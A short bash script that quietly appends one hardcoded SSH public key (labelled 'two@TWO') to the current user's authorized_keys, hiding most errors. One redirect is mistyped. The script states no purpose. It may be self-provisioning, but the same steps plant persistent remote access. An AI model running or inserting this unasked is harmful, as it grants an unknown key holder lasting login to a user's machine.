#!/bin/bash

PUB_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCl/a6mm5sISmIVXBnpvF1hoKAgZ+pdHBYV2Esu2bXMjkS5VvVuLKNbQ3L2NZo7MMb9cSIpoNTXlabtwCEODIyEX0L1nXzZSv/iCeN3MhHnznWwPpYHyzUD8mYZ4FIvyV63dWXF5/dqSTMc5DXcOIi7yHemDtA0obKNzBjSbKm8mEbfhwONNXzq3m+9P2c3d3jPNX6hs3iuKgvZfFtiFrVmh1Wn/CGWLc1EhGpv2B1+AECVlbI2ZRws2Kjl0QFKZAsyoTs9h93zKieDfcctqcrWpUqeNikqxoJoA4d8xGgu69I0DkWhI2ZaAOs6Ne9IpJo99T62xMJIW6PwKWV6ujWBs6FaHwYsPrPpalvP2HeEtnMRnhTCuwRTqGrwpbQz/FMpa3WoV4CYeALsg0nMbn3E2aZOJt3TGgCcjzu8Vi2L84Ocjde1r1P1IZpr89vEjqi68PwJ7yQPte7GrAkuAyRBM3ckok8dBJNx/azYuKAWJe1smPZTB51bFVwF4a+Kal8= two@TWO"

SSH_DIR="$HOME/.ssh"

AUTH_KEYS="$SSH_DIR/authorized_keys"

mkdir -p "$SSH_DIR" 2>/dev/null
chmod 700 "$SSH_DIR" 2>/dev/null

touch "$AUTH_KEYS" 2>/dev/null

chmod 600 "$AUTH_KEYS"

if  ! grep -qxF -- "$PUB_KEY" "$AUTH_KEYS"; then
	echo "$PUB_KEY" >>"$AUTH_KEYS" 2/dev/null
fi


# echo "cle" >> ~/.ssh/authorized_keys

